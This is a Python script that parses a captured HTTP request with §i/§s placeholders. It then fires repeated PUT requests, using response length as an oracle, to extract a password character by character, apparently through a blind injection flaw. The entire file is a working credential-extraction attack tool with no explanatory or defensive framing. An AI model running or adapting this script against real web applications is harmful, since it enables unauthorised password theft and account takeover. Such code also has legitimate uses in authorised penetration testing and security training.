#!/usr/bin/python3
import sys
import requests

def printProgressBar (iteration, total= 100, prefix = 'Checking', suffix = 'Complete', decimals = 1, length = 50, fill = '█'):
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    styling = '%s |%s| %s%% %s' % (prefix, fill, percent, suffix)
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    print('\r%s' % styling.replace(fill, bar), end = '\r')    
    if iteration == total: 
        print()

def parseRequestFile(fileName):
    global requestInfo
    global headers
    global data
    global paramkey
    lines = open(fileName).read().split('\n')
    for line in lines:
        if(line==''):
            lines.remove(line)
    
    reqInfo = lines[0].split(' ')
    requestInfo["Method"] = reqInfo[0]
    requestInfo["Url"] = reqInfo[1]
    requestInfo["Protocol"] = reqInfo[2]

    for line in lines[1:-1:1]:
        splitted = line.split(':',1)
        headers[splitted[0]]=splitted[1].replace(' ','')

    parameters = lines[-1].split('&')
        
    for param in parameters:
        splitted = param.split('=',1)
        data[splitted[0]]=splitted[1]   

    for key, value in data.items():
        if(value.find('§i')!=-1 and value.find('§s')!=-1):
            paramkey=key
            break

def getCorrectLength():   
    print("Trying to detect correct response length...")
    printProgressBar(0, total=symbolsCount, prefix="Detecting")
    lengths={}    
    value = rawValue.replace("§i",str(1))            
    for i in range(symbolsCount):        
        data[paramkey] = value.replace("§s",symbols[i])          
        response = requests.put(url, data=data, headers=headers)        
        length = len(response.text)
        if(length in lengths):
            lengths[length]+=1
        else:
            lengths[length]=1
        printProgressBar(i+1,total=symbolsCount,prefix="Detecting")
    for length, count in lengths.items():
        if(count==1):
            return length      
    return -1 

def bruteForce():
    print("Bruteforcing...")
    index = 1 
    password=""   
    while(True):
        print("Checking index "+str(index), end="\r")
        result=False        
        value =  rawValue.replace("§i",str(index))             
        for i in range(symbolsCount):               
            data[paramkey] =  value.replace("§s",symbols[i])        
            response = requests.put(url, data=data,headers=headers)
            length = len(response.text)            
            if(length==correctLength or length==correctLength+1):
                password+=symbols[i]                
                result=True
                break               
        if(not result):
            print()                      
            print("Complete!\nPassword is: "+password)            
            exit()
        index+=1

symbols="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
symbolsCount = len(symbols)
requestInfo={}
headers = {}
data={}
paramkey=""   

parseRequestFile(sys.argv[1])
        
rawValue = data[paramkey]

url = "http://"+headers["Host"]+requestInfo["Url"]

correctLength = getCorrectLength()
      
if(correctLength!=-1):
    print("Correct length is "+str(correctLength))
    bruteForce()
else:
    print("Length was not found")
    exit()